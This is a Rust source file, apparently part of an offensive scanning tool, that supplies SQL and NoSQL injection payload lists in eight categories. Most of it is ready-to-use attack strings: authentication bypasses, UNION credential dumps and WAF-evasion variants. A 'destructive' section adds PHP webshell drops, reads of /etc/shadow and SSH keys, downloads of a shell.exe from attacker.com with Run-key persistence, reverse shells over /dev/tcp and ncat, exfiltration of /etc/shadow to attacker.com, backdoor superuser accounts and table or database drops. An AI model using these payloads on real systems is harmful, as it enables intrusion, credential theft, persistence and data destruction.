// ----------------------------------------------------------------------------
//  sql_injection.rs — SQL injection payloads
// ----------------------------------------------------------------------------
//  SQL injection payloads — error-based, union, boolean, time-blind, NoSQL.
//
//  --- Developers ---------------------------------------------------------------
//  khaninkali             — разработчик / core engineer (Rust backend, logic)
//  Lyara Koroleva         — дизайнер / blazing fast CLI & interface design
//  HsecDevelopers         — 测试 / テスト / testing & QA (integration, validation)
//  projectk 2091         — HyperSecurityOffensiveLabs lineage
// ----------------------------------------------------------------------------
//
//
// ---------------------------------------------------------------------------
//  ⚠ WARNING / 警告 / 警告
// ---------------------------------------------------------------------------
//  This source code is the exclusive property of HyperSecurityOffensiveLabs.
//  You are permitted to VIEW this code for educational and reference
//  purposes only. You may NOT modify, distribute, sublicense, or create
//  derivative works without explicit written permission from khaninkali
//  and the HyperSecurityOffensiveLabs development team.
//
//  このソースコードはHyperSecurityOffensiveLabsの独占的知的財産です。
//  教育目的および参照目的での閲覧のみ許可されています。
//  khaninkaliおよびHyperSecurityOffensiveLabs開発チームの
//  書面による明示的な許可なく、修正、配布、サブライセンス、
//  または二次的著作物の作成を禁止します。
//
//  本源代码是HyperSecurityOffensiveLabs的独家财产。
//  仅允许出于教育和参考目的查看。未经khaninkali和
//  HyperSecurityOffensiveLabs开发团队的书面明确许可，
//  禁止修改、分发、再许可或创建衍生作品。
// ---------------------------------------------------------------------------
//
//

// ◆ SqlInjection: SQLインジェクションペイロード
// ◆ Comprehensive SQLi payload library — 8 categories across DBMS types.
// ■ ペイロードカテゴリ:
//   ➊ get_error_payloads — エラーベース電脳検出 (MySQL/MSSQL/PgSQL/Oracle)
//   ➋ get_union_payloads — UNIONベースデータ抽出 (全DBMS対応)
//   ➌ get_time_payloads — 時間ベースブラインド (SLEEP/WAITFOR/pg_sleep)
//   ➍ get_boolean_payloads — ブールベースブラインド (true/falseペア)
//   ➎ get_stacked_payloads — スタックドクエリ (xp_cmdshell/COPY/OUTFILE)
//   ➏ get_waf_bypass_payloads — WAFバイパス (コメント/ケース/エンコード)
//   ➐ get_nosql_payloads — NoSQL注入 (MongoDB $gt/$ne/$regex/$where)
//   ➑ get_destructive_payloads — 電脳攻撃的ペイロード (RCE/権限昇格/データ窃取)
/// SQL injection payload library — error-based, union, boolean, time, OOB, NoSQL.
pub struct SqlInjection;

impl SqlInjection {
    // ── Error-based detection ─────────────────────────────────────────────────

    // ◆ get_error_payloads: エラーベースSQLインジェクション
    // ◆ Error-based detection — quote triggers, boolean tautologies, ORDER/GROUP BY probing.
    // ■ サブカテゴリ:
    //   - 引用符トリガ: ', ", `, %27, %22
    //   - ブール恒真式: OR 1=1, OR '1'='1 (差分電脳検出用の偽式も含む)
    //   - カラム数探索: ORDER BY n, GROUP BY n (1〜100)
    //   - エラーベース抽出: extractvalue/updatexml (MySQL), convert(int) (MSSQL/PgSQL/Oracle)
    pub fn get_error_payloads() -> Vec<String> {
        vec![
            // Quote triggers
            "'".to_string(),
            "''".to_string(),
            "\"".to_string(),
            "`".to_string(),
            "%27".to_string(),
            "%22".to_string(),
            // Boolean tautologies
            "' OR '1'='1".to_string(),
            "' OR '1'='1'--".to_string(),
            "' OR '1'='1'#".to_string(),
            "' OR 1=1--".to_string(),
            "' OR 1=1#".to_string(),
            "1 OR 1=1".to_string(),
            "\" OR \"1\"=\"1".to_string(),
            "\" OR 1=1--".to_string(),
            "') OR ('1'='1".to_string(),
            "') OR 1=1--".to_string(),
            ")) OR 1=1--".to_string(),
            "' OR NULL IS NULL--".to_string(),
            // Boolean contradictions (for differential detection)
            "' AND '1'='2".to_string(),
            "' AND 1=2--".to_string(),
            "' AND 1=3#".to_string(),
            "1 AND 1=2".to_string(),
            "' AND NULL IS NOT NULL--".to_string(),
            // Column count probing
            "' ORDER BY 1--".to_string(),
            "' ORDER BY 2--".to_string(),
            "' ORDER BY 3--".to_string(),
            "' ORDER BY 5--".to_string(),
            "' ORDER BY 10--".to_string(),
            "' ORDER BY 50--".to_string(),
            "' ORDER BY 100--".to_string(),
            "' GROUP BY 1--".to_string(),
            "' GROUP BY 2--".to_string(),
            "' GROUP BY 3--".to_string(),
            // Error-based extraction (MySQL)
            "' AND extractvalue(1,concat(0x7e,(SELECT version())))--".to_string(),
            "' AND updatexml(1,concat(0x7e,(SELECT version())),1)--".to_string(),
            "' AND (SELECT 1 FROM (SELECT count(*),concat(version(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--".to_string(),
            "' AND (SELECT 1 FROM (SELECT count(*),concat(database(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--".to_string(),
            "' AND (SELECT 1 FROM (SELECT count(*),concat(user(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--".to_string(),
            // Error-based extraction (MSSQL)
            "' AND 1=convert(int,(SELECT TOP 1 table_name FROM information_schema.tables))--".to_string(),
            "' AND 1=convert(int,(SELECT TOP 1 column_name FROM information_schema.columns))--".to_string(),
            "' AND 1=convert(int,(SELECT @@version))--".to_string(),
            // Error-based extraction (PostgreSQL)
            "' AND 1=cast((SELECT version()) as int)--".to_string(),
            "' AND 1=cast((SELECT current_user) as int)--".to_string(),
            "' AND 1=cast((SELECT current_database()) as int)--".to_string(),
            // Error-based extraction (Oracle)
            "' AND 1=ctxsys.drithsx.sn(1,(SELECT banner FROM v$version WHERE rownum=1))--".to_string(),
            "' AND 1=ctxsys.drithsx.sn(1,(SELECT user FROM dual))--".to_string(),
        ]
    }

    // ── UNION-based ───────────────────────────────────────────────────────────

    // ◆ get_union_payloads: UNIONベースデータ抽出
    // ◆ UNION SELECT payloads for column discovery and data extraction.
    // ■ カラム数探索: NULLパディング (MySQL: user(), @@version, database())
    // ■ DBMS別抽出: MySQL (group_concat), PostgreSQL (current_user), MSSQL (@@version), Oracle (v$version)
    pub fn get_union_payloads() -> Vec<String> {
        vec![
            // Column count discovery
            "' UNION SELECT NULL--".to_string(),
            "' UNION SELECT NULL,NULL--".to_string(),
            "' UNION SELECT NULL,NULL,NULL--".to_string(),
            "' UNION SELECT NULL,NULL,NULL,NULL--".to_string(),
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL--".to_string(),
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--".to_string(),
            "\" UNION SELECT NULL,NULL--".to_string(),
            "') UNION SELECT NULL,NULL--".to_string(),
            ")) UNION SELECT NULL,NULL--".to_string(),
            // Data extraction — MySQL
            "' UNION SELECT user(),NULL--".to_string(),
            "' UNION SELECT @@version,NULL--".to_string(),
            "' UNION SELECT database(),NULL--".to_string(),
            "' UNION SELECT table_name,NULL FROM information_schema.tables--".to_string(),
            "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--".to_string(),
            "' UNION SELECT table_schema,table_name FROM information_schema.tables--".to_string(),
            "' UNION SELECT column_name,data_type FROM information_schema.columns WHERE table_name='users'--".to_string(),
            "' UNION SELECT username,password FROM users--".to_string(),
            "' UNION SELECT user,password FROM mysql.user--".to_string(),
            "' UNION SELECT group_concat(table_name),NULL FROM information_schema.tables--".to_string(),
            "' UNION SELECT group_concat(column_name),NULL FROM information_schema.columns WHERE table_name='users'--".to_string(),
            // Multi-column extraction
            "' UNION SELECT 1,2,3,4,5--".to_string(),
            "' UNION SELECT 1,@@version,3,4,5--".to_string(),
            "' UNION SELECT 1,database(),user(),4,5--".to_string(),
            // PostgreSQL
            "' UNION SELECT version(),NULL--".to_string(),
            "' UNION SELECT current_user,NULL--".to_string(),
            "' UNION SELECT current_database(),NULL--".to_string(),
            "' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'--".to_string(),
            "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--".to_string(),
            // MSSQL
            "' UNION SELECT @@version,NULL--".to_string(),
            "' UNION SELECT SYSTEM_USER,NULL--".to_string(),
            "' UNION SELECT DB_NAME(),NULL--".to_string(),
            "' UNION SELECT name,NULL FROM sys.tables--".to_string(),
            "' UNION SELECT name,NULL FROM sys.columns WHERE object_id=OBJECT_ID('users')--".to_string(),
            // Oracle
            "' UNION SELECT banner,NULL FROM v$version--".to_string(),
            "' UNION SELECT user,NULL FROM dual--".to_string(),
            "' UNION SELECT table_name,NULL FROM user_tables--".to_string(),
            "' UNION SELECT column_name,NULL FROM user_tab_columns WHERE table_name='USERS'--".to_string(),
        ]
    }

    // ── Time-based blind ──────────────────────────────────────────────────────

    // ◆ get_time_payloads: 時間ベースブラインドSQLインジェクション
    // ◆ Time-based blind detection via DBMS-specific sleep functions.
    // ■ MySQL: SLEEP(n), BENCHMARK(n, expr)
    // ■ MSSQL: WAITFOR DELAY '0:0:n'
    // ■ PostgreSQL: pg_sleep(n)
    // ■ Oracle: dbms_pipe.receive_message, dbms_lock.sleep
    // ■ SQLite: randomblob(n) — 重い計算で遅延
    // ■ DB2: 無限再帰CTEで遅延
    pub fn get_time_payloads() -> Vec<String> {
        vec![
            // MySQL — SLEEP / BENCHMARK
            "' AND SLEEP(5)--".to_string(),
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--".to_string(),
            "' AND (SELECT SLEEP(5))--".to_string(),
            "1; SELECT SLEEP(5)--".to_string(),
            "' AND SLEEP(3)--".to_string(),
            "'; SELECT SLEEP(3)#".to_string(),
            "' AND BENCHMARK(50000000,MD5('x'))--".to_string(),
            "' AND BENCHMARK(10000000,AES_DECRYPT('x','y'))--".to_string(),
            // MSSQL — WAITFOR DELAY
            "'; WAITFOR DELAY '0:0:5'--".to_string(),
            "1; WAITFOR DELAY '0:0:5'--".to_string(),
            "'; WAITFOR DELAY '00:00:03'--".to_string(),
            "'; WAITFOR DELAY '0:0:5'#".to_string(),
            // PostgreSQL — pg_sleep
            "'; SELECT pg_sleep(5)--".to_string(),
            "1; SELECT pg_sleep(5)--".to_string(),
            "'; SELECT pg_sleep(3)--".to_string(),
            "' OR (SELECT pg_sleep(5))--".to_string(),
            // Oracle — dbms_pipe.receive_message
            "' AND 1=dbms_pipe.receive_message('a',5)--".to_string(),
            "' OR dbms_pipe.receive_message('a',3)=1--".to_string(),
            "' AND 1=dbms_lock.sleep(5)--".to_string(),
            // SQLite — randomblob (heavy computation)
            "' AND 1=randomblob(500000000)--".to_string(),
            "' AND 1=randomblob(100000000)--".to_string(),
            // DB2
            "' AND 1=WITH INFINITE AS (SELECT 1 FROM sysibm.sysdummy1 UNION ALL SELECT 1 FROM INFINITE) SELECT COUNT(*) FROM INFINITE--".to_string(),
        ]
    }

    // ── Boolean-based blind ───────────────────────────────────────────────────

    // ◆ get_boolean_payloads: ブールベースブラインドSQLインジェクション
    // ◆ Boolean-based blind — pairs of (true_condition, false_condition) for differential analysis.
    // ■ 条件ペア:
    //   - 1=1 vs 1=2 (基本)
    //   - SUBSTRING/ASCII比較 (バージョン・文字列推測)
    //   - LENGTH > n (長さ推測)
    //   - COUNT(*) > 0 (テーブル存在確認)
    pub fn get_boolean_payloads() -> Vec<(String, String)> {
        vec![
            ("' AND '1'='1".to_string(), "' AND '1'='2".to_string()),
            ("' AND 1=1--".to_string(),  "' AND 1=2--".to_string()),
            ("1 AND 1=1".to_string(),    "1 AND 1=2".to_string()),
            ("' AND 1=1#".to_string(),   "' AND 1=2#".to_string()),
            // Substring extraction (MySQL)
            ("' AND SUBSTRING(@@version,1,1)='5'--".to_string(),
             "' AND SUBSTRING(@@version,1,1)='9'--".to_string()),
            ("' AND ASCII(SUBSTRING(@@version,1,1))>100--".to_string(),
             "' AND ASCII(SUBSTRING(@@version,1,1))>120--".to_string()),
            ("' AND (SELECT LENGTH(database()))>5--".to_string(),
             "' AND (SELECT LENGTH(database()))>10--".to_string()),
            // Substring extraction (PostgreSQL)
            ("' AND SUBSTRING(version(),1,1)='P'--".to_string(),
             "' AND SUBSTRING(version(),1,1)='X'--".to_string()),
            ("' AND (SELECT LENGTH(current_database()))>3--".to_string(),
             "' AND (SELECT LENGTH(current_database()))>10--".to_string()),
            // Table / column inference
            ("' AND (SELECT COUNT(*) FROM users)>0--".to_string(),
             "' AND (SELECT COUNT(*) FROM users)<0--".to_string()),
            ("' AND (SELECT COUNT(*) FROM information_schema.tables)>10--".to_string(),
             "' AND (SELECT COUNT(*) FROM information_schema.tables)<0--".to_string()),
        ]
    }

    // ── Stacked queries ───────────────────────────────────────────────────────

    // ◆ get_stacked_payloads: スタックドクエリペイロード
    // ◆ Stacked query execution — RCE, file operations, privilege escalation.
    // ■ MSSQL: xp_cmdshell (RCE), xp_regread (レジストリ), sp_makewebtask (ファイル書き込み)
    // ■ PostgreSQL: COPY FROM/TO PROGRAM (RCE), lo_import/lo_export (ファイル読み取り)
    // ■ MySQL: INTO OUTFILE (webshell), LOAD_FILE (/etc/passwd), CREATE USER
    // ■ 汎用: DROP TABLE, TRUNCATE, CREATE USER
    pub fn get_stacked_payloads() -> Vec<String> {
        vec![
            // MSSQL — xp_cmdshell
            "'; EXEC xp_cmdshell('whoami')--".to_string(),
            "'; EXEC xp_cmdshell('net user')--".to_string(),
            "'; EXEC xp_cmdshell('ipconfig')--".to_string(),
            "'; EXEC xp_cmdshell('netstat -an')--".to_string(),
            "'; EXEC xp_cmdshell('dir C:\\')--".to_string(),
            "'; EXEC xp_cmdshell('type C:\\Windows\\win.ini')--".to_string(),
            // MSSQL — enable xp_cmdshell
            "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--".to_string(),
            // MSSQL — xp_regread
            "'; EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName', 'ComputerName'--".to_string(),
            // MSSQL — sp_makewebtask (write file)
            "'; EXEC sp_makewebtask 'C:\\inetpub\\wwwroot\\test.aspx', '<%@ Page Language=\"JScript\"%><%eval(Request.Item[\"c\"],\"unsafe\");%>'--".to_string(),
            // PostgreSQL — COPY FROM PROGRAM (RCE)
            "'; COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec--".to_string(),
            "'; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'--".to_string(),
            "'; COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/exfil'--".to_string(),
            "'; COPY (SELECT '') TO PROGRAM 'nslookup attacker.com'--".to_string(),
            // PostgreSQL — lo_import/lo_export
            "'; SELECT lo_import('/etc/passwd')--".to_string(),
            "'; SELECT lo_export(12345, '/tmp/outfile')--".to_string(),
            // PostgreSQL — CREATE USER
            "'; CREATE USER oxide WITH PASSWORD 'Pwn3d!123' SUPERUSER--".to_string(),
            "'; DROP USER IF EXISTS oxide--".to_string(),
            // PostgreSQL — DROP TABLE
            "'; DROP TABLE IF EXISTS users CASCADE--".to_string(),
            "'; DROP TABLE IF EXISTS sessions CASCADE--".to_string(),
            // MySQL — INTO OUTFILE (write webshell)
            "' UNION SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--".to_string(),
            "' UNION SELECT '<?=system($_GET[0])?>' INTO OUTFILE '/var/www/html/evil.php'--".to_string(),
            "' UNION SELECT '' INTO OUTFILE '/var/www/html/test.php'--".to_string(),
            // MySQL — LOAD_FILE
            "' UNION SELECT LOAD_FILE('/etc/passwd')--".to_string(),
            "' UNION SELECT LOAD_FILE('/etc/shadow')--".to_string(),
            // MySQL — CREATE USER / GRANT
            "'; CREATE USER oxide@'%' IDENTIFIED BY 'Pwn3d!123'; GRANT ALL PRIVILEGES ON *.* TO oxide@'%'; FLUSH PRIVILEGES--".to_string(),
            "'; DROP USER IF EXISTS oxide@'%'--".to_string(),
            // MySQL — DROP DATABASE
            "'; DROP DATABASE IF EXISTS (SELECT database())--".to_string(),
            // MySQL — TRUNCATE
            "'; TRUNCATE users--".to_string(),
            "'; TRUNCATE admins--".to_string(),
        ]
    }

    // ── WAF bypass variants ───────────────────────────────────────────────────

    // ◆ get_waf_bypass_payloads: WAFバイパスSQLインジェクション
    // ◆ WAF evasion techniques — comment injection, case obfuscation, encoding tricks.
    // ■ 手法:
    //   - コメントスペース: /**/ でスペース代替
    //   - ケース混合: UnIoN SeLeCt
    //   - エンコード: URL/二重URL/Unicode (%u0027)
    //   - 空白代替: タブ/改行 (\t\n\r)
    //   - インラインコメント: /*!50000OR*/
    //   - 科学表記: 1e0=1e0 / 16進: 0x31=0x31
    //   - 演算子代替: || / && / | / &
    pub fn get_waf_bypass_payloads() -> Vec<String> {
        vec![
            // Comment-based space bypass
            "'/**/OR/**/1=1--".to_string(),
            "'/*!OR*/1=1--".to_string(),
            "'/**/AND/**/1=1--".to_string(),
            "'/**/UNION/**/SELECT/**/1,2,3--".to_string(),
            // Case variation
            "' oR '1'='1".to_string(),
            "' Or 1=1--".to_string(),
            "' UnIoN SeLeCt 1,2,3--".to_string(),
            "' AnD 1=1--".to_string(),
            // URL encoding
            "%27%20OR%201%3D1--".to_string(),
            "%27%20UNION%20SELECT%201%2C2%2C3--".to_string(),
            // Double URL encoding
            "%2527%2520OR%25201%253D1--".to_string(),
            "%2527%2520UNION%2520SELECT%25201%252C2%252C3--".to_string(),
            // Unicode encoding
            "%u0027%20OR%201=1--".to_string(),
            // Whitespace alternatives
            "'\tor\t'1'='1".to_string(),
            "'\nor\n'1'='1".to_string(),
            "'\r\nOR\r\n1=1--".to_string(),
            "'\tUNION\tSELECT\t1,2,3--".to_string(),
            // Inline comments
            "'/*!50000OR*/1=1--".to_string(),
            "'/*!12345UNION*//*!12345SELECT*/1,2,3--".to_string(),
            "'/*!50000AND*/1=1--".to_string(),
            // Scientific notation
            "' OR 1e0=1e0--".to_string(),
            "' OR 1.0=1.0--".to_string(),
            "' OR .1=.1--".to_string(),
            // Hex string
            "' OR 0x31=0x31--".to_string(),
            "' OR 0x41=0x41--".to_string(),
            // Operator substitution
            "' || 1=1--".to_string(),
            "' && 1=1--".to_string(),
            "' | 1=1--".to_string(),
            "' & 1=1--".to_string(),
            // No-space variants
            "'OR'1'='1".to_string(),
            "'OR1=1--".to_string(),
            "'UNION(SELECT(1))--".to_string(),
            "'UNION(SELECT(@@version))--".to_string(),
            // Double-query WAF confusion
            "' OR 1=1 AND 1=2--".to_string(),
            "' OR 1=1-- AND 1=2#".to_string(),
        ]
    }

    // ── NoSQL injection ───────────────────────────────────────────────────────

    /// MongoDB / NoSQL injection payloads.
    // ◆ get_nosql_payloads: NoSQLインジェクション
    // ◆ MongoDB/NoSQL operator injection — bypass authentication, extract data.
    // ■ JSON body injection: {"$gt": ""}, {"$ne": null}, {"$regex": ".*"}, {"$where": "1==1"}
    // ■ URL param injection: [$ne]=1, [$regex]=.*, [$where]=1
    // ■ JavaScript injection: '; return true; var x='
    // ■ Array injection: [], [$in]=[1,2,3]
    pub fn get_nosql_payloads() -> Vec<String> {
        vec![
            // MongoDB operator injection (JSON body)
            "{\"$gt\": \"\"}".to_string(),
            "{\"$ne\": null}".to_string(),
            "{\"$regex\": \".*\"}".to_string(),
            "{\"$where\": \"1==1\"}".to_string(),
            "{\"$gt\": \"\"}".to_string(),
            "{\"$ne\": \"\"}".to_string(),
            "{\"$nin\": []}".to_string(),
            "{\"$exists\": true}".to_string(),
            // URL parameter injection
            "[$ne]=1".to_string(),
            "[$gt]=".to_string(),
            "[$regex]=.*".to_string(),
            "[$ne]=null".to_string(),
            "[$where]=1".to_string(),
            // JavaScript injection via $where
            "'; return true; var x='".to_string(),
            "'; return this.password.match(/.*/) //".to_string(),
            "'; return 1==1//".to_string(),
            "'; return this.role=='admin'//".to_string(),
            // Array injection
            "[]".to_string(),
            "[0]=1".to_string(),
            "[$in]=[1,2,3]".to_string(),
            // NoSQL boolean
            "{\"$or\": [{\"a\": \"a\"}, {\"b\": \"b\"}]}".to_string(),
            "{\"$and\": [{\"a\": \"a\"}, {\"b\": \"b\"}]}".to_string(),
        ]
    }

    // ── Destructive / real-world attack payloads ──────────────────────────────

    /// Real attack payloads that professional red teams use for exploitation.
    /// Includes RCE, webshell deployment, data exfiltration, privilege escalation.
    // ◆ get_destructive_payloads: 実戦的電脳攻撃ペイロード
    // ◆ Professional red-team payloads — RCE, webshell, data exfil, priv-esc.
    // ■ カテゴリ:
    //   MySQL: INTO OUTFILE webshell (Linux), LOAD_FILE, CREATE USER
    //   MSSQL: xp_cmdshell RCE, xp_regread, xp_dirtree, sp_addlogin
    //   PostgreSQL: COPY TO PROGRAM RCE, lo_import, CREATE USER SUPERUSER
    //   Oracle: UTL_FILE write, UTL_HTTP exfil, CREATE USER DBA
    pub fn get_destructive_payloads() -> Vec<String> {
        vec![
            // ── MySQL: INTO OUTFILE webshells (Linux) ──
            "' UNION SELECT '<?php system($_GET[0]);?>' INTO OUTFILE '/var/www/html/oxide.php'--".to_string(),
            "' UNION SELECT '<?php system($_GET[0]);?>' INTO OUTFILE '/var/www/shell.php'--".to_string(),
            "' UNION SELECT \"<?php system($_GET[0]);?>\" INTO OUTFILE '/var/www/html/oxide.php'--".to_string(),
            "' UNION SELECT '<?php system($_GET[0]);?>' INTO OUTFILE '/var/www/html/backdoor.php'--".to_string(),
            "' UNION SELECT '<?=system($_REQUEST[0])?>' INTO OUTFILE '/var/www/html/rce.php'--".to_string(),
            "' UNION SELECT '<?php echo shell_exec($_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/cmd.php'--".to_string(),
            // ── MySQL: INTO DUMPFILE binary webshell ──
            "' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b305d293b3f3e INTO DUMPFILE '/var/www/html/oxide.php'--".to_string(),
            "' UNION SELECT 0x3c3f706870206563686f207368656c6c5f6578656328245f4745545b2263225d293b203f3e INTO DUMPFILE '/var/www/html/cmd2.php'--".to_string(),
            // ── MySQL: LOAD_FILE sensitive files ──
            "' UNION SELECT LOAD_FILE('/etc/shadow'),NULL--".to_string(),
            "' UNION SELECT LOAD_FILE('/etc/passwd'),LOAD_FILE('/etc/shadow')--".to_string(),
            "' UNION SELECT LOAD_FILE('/var/log/auth.log'),NULL--".to_string(),
            "' UNION SELECT LOAD_FILE('/var/log/mysql/error.log'),NULL--".to_string(),
            "' UNION SELECT LOAD_FILE('/etc/nginx/nginx.conf'),NULL--".to_string(),
            "' UNION SELECT LOAD_FILE('/etc/apache2/apache2.conf'),NULL--".to_string(),
            "' UNION SELECT LOAD_FILE('/root/.ssh/id_rsa'),NULL--".to_string(),
            // ── MySQL: Bulk table dump to file ──
            "' SELECT * FROM users INTO OUTFILE '/tmp/users.txt'--".to_string(),
            "' SELECT * FROM mysql.user INTO OUTFILE '/tmp/mysql_users.txt'--".to_string(),
            "' SELECT * FROM credit_cards INTO OUTFILE '/tmp/cc.txt'--".to_string(),
            // ── MySQL: Create user / grant privs ──
            "'; CREATE USER oxide@'%' IDENTIFIED BY 'Pwn3d!123'; GRANT ALL PRIVILEGES ON *.* TO oxide@'%'; FLUSH PRIVILEGES--".to_string(),
            "'; GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY 'Pwn3d!123' WITH GRANT OPTION--".to_string(),
            // ── MySQL: Drop database / table ──
            "'; DROP DATABASE IF EXISTS (SELECT database())--".to_string(),
            "'; DROP TABLE IF EXISTS users--".to_string(),
            "'; DROP TABLE IF EXISTS admins--".to_string(),
            "'; TRUNCATE users--".to_string(),
            // ── MySQL: UPDATE privilege escalation ──
            "'; UPDATE mysql.user SET Grant_priv='Y', Super_priv='Y' WHERE user='root'--".to_string(),
            "'; UPDATE users SET admin=1 WHERE id=1--".to_string(),
            // ── MSSQL: xp_cmdshell full RCE ──
            "'; EXEC xp_cmdshell 'whoami'--".to_string(),
            "'; EXEC xp_cmdshell 'powershell -enc aB3AGgAbwBhAG0AaQ=='--".to_string(),
            "'; EXEC xp_cmdshell 'certutil -urlcache -f http://attacker.com/shell.exe C:\\shell.exe'--".to_string(),
            "'; EXEC xp_cmdshell 'reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v oxide /t REG_SZ /d C:\\shell.exe'--".to_string(),
            "'; EXEC xp_cmdshell 'powershell -c \"IEX(New-Object Net.WebClient).downloadString(''http://attacker.com/ps.ps1'')\"'--".to_string(),
            "'; EXEC xp_cmdshell 'bitsadmin /transfer job /download /priority high http://attacker.com/shell.exe C:\\shell.exe'--".to_string(),
            // ── MSSQL: xp_regread registry read ──
            "'; EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SYSTEM\\CurrentControlSet\\Control\\Terminal Server', 'fDenyTSConnections'--".to_string(),
            "'; EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SAM\\SAM\\Domains\\Account\\Users\\Names', 'Administrator'--".to_string(),
            "'; EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName'--".to_string(),
            // ── MSSQL: xp_dirtree (list files) ──
            "'; EXEC xp_dirtree 'C:\\inetpub\\wwwroot',1,1--".to_string(),
            "'; EXEC xp_dirtree 'C:\\',1,1--".to_string(),
            // ── MSSQL: OPENROWSET linked server ──
            "'; SELECT * FROM OPENROWSET('SQLNCLI', 'Server=target;Trusted_Connection=yes;', 'SELECT @@version')--".to_string(),
            "'; SELECT * FROM OPENROWSET('SQLNCLI', 'Server=.;Trusted_Connection=yes;', 'SELECT name FROM master..sysdatabases')--".to_string(),
            // ── MSSQL: sp_addlogin priv esc ──
            "'; EXEC sp_addlogin 'oxide', 'Pwn3d!123', 'master'--".to_string(),
            "'; EXEC sp_addsrvrolemember 'oxide', 'sysadmin'--".to_string(),
            "'; EXEC sp_addsrvrolemember 'oxide', 'db_owner'--".to_string(),
            // ── PostgreSQL: COPY TO PROGRAM RCE ──
            "'; COPY (SELECT 'oxide') TO PROGRAM 'curl http://attacker.com/$(whoami)'--".to_string(),
            "'; COPY (SELECT 'oxide') TO PROGRAM 'wget --post-data=$(cat /etc/shadow) http://attacker.com/'--".to_string(),
            "'; COPY (SELECT '') TO PROGRAM 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'--".to_string(),
            "'; COPY (SELECT '') TO PROGRAM 'ncat -e /bin/sh attacker.com 4444'--".to_string(),
            // ── PostgreSQL: lo_import/lo_export file read ──
            "'; SELECT lo_import('/etc/shadow')--".to_string(),
            "'; SELECT lo_import('/etc/passwd')--".to_string(),
            "'; SELECT lo_import('/root/.ssh/id_rsa')--".to_string(),
            // ── PostgreSQL: CREATE USER with superuser ──
            "'; CREATE USER oxide WITH PASSWORD 'Pwn3d!123' SUPERUSER--".to_string(),
            "'; ALTER USER postgres WITH PASSWORD 'Pwn3d!123'--".to_string(),
            // ── PostgreSQL: DROP table cascade ──
            "'; DROP TABLE IF EXISTS users CASCADE--".to_string(),
            "'; DROP TABLE IF EXISTS sessions CASCADE--".to_string(),
            "'; DROP SCHEMA public CASCADE--".to_string(),
            // ── Oracle: UTL_FILE file write ──
            "' AND 1=(SELECT UTL_FILE.PUT_LINE('/tmp','oxide.php','<?php system($_GET[0]);?>') FROM dual)--".to_string(),
            "' AND 1=(SELECT UTL_FILE.PUT_LINE('/var/www/html','rce.php','<?=system($_GET[0])?>') FROM dual)--".to_string(),
            // ── Oracle: CREATE USER ──
            "' AND 1=(SELECT 1 FROM dual WHERE 1=1); CREATE USER oxide IDENTIFIED BY Pwn3d!123; GRANT DBA TO oxide--".to_string(),
            // ── Oracle: UTL_HTTP data exfil ──
            "' AND 1=(SELECT UTL_HTTP.request('http://attacker.com/'||(SELECT banner FROM v$version WHERE rownum=1)) FROM dual)--".to_string(),
            // ── Generic: Stacked query data exfil ──
            "'; SELECT * FROM users--".to_string(),
            "'; SELECT * FROM credit_cards--".to_string(),
            "'; SELECT * FROM passwords--".to_string(),
            "'; SELECT * FROM admins--".to_string(),
            "'; SELECT * FROM sessions--".to_string(),
            "'; SELECT * FROM tokens--".to_string(),
            "'; SELECT * FROM api_keys--".to_string(),
        ]
    }

}
